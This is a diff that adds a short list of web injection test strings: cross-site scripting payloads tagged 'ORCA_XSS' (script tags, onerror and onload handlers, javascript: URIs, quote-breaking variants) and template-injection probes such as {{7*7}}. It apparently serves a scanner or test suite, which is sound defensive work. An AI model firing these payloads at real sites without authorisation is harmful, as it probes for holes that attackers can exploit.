@@ -1,0 +1,13 @@
+<script>alert('ORCA_XSS')</script>
+<img src=x onerror=alert('ORCA_XSS')>
+<svg onload=alert('ORCA_XSS')>
+<body onload=alert('ORCA_XSS')>
+<iframe src=javascript:alert('ORCA_XSS')>
+javascript:alert('ORCA_XSS')
+"><script>alert('ORCA_XSS')</script>
+'><img src=x onerror=alert('ORCA_XSS')>
+`><script>alert('ORCA_XSS')</script>
+</script><script>alert('ORCA_XSS')</script>
+${alert('ORCA_XSS')}
+{{7*7}}
+<%= 7*7 %>
